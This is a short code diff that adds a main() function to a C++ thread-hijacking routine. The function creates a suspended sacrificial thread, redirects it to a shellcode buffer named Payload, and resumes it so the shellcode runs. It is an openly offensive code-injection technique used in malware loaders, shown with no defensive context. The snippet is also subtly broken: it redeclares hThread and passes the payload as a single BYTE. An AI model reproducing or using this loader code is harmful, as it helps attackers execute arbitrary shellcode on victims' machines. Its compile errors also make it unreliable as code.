@@ -34,3 +34,25 @@ BOOL RunViaClassicThreadHijacking(IN HANDLE hThread, IN BYTE pPayload, IN SIZE_T
 
 	return TRUE;
 }
+
+
+int main() {
+	HANDLE hThread = NULL;
+
+	//creating sacrificial thread in suspended state
+	HANDLE hThread = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)&DummyFunction, NULL, CREATE_SUSPENDED, NULL);
+	if (!hThread) {
+		std::wcerr << L"[!] CreateThread Failed with error : " << GetLastError() << std::endl;
+		return FALSE;
+	}
+
+	//hijacking the sacrificial thread created
+	if (!RunViaClassicThreadHijacking(hThread, Payload, sizeof(Payload))) {
+		return -1;
+	}
+
+	//resuming suspended thread si that it runs our shellcode
+	ResumeThread(hThread);
+
+	return 0;
+}
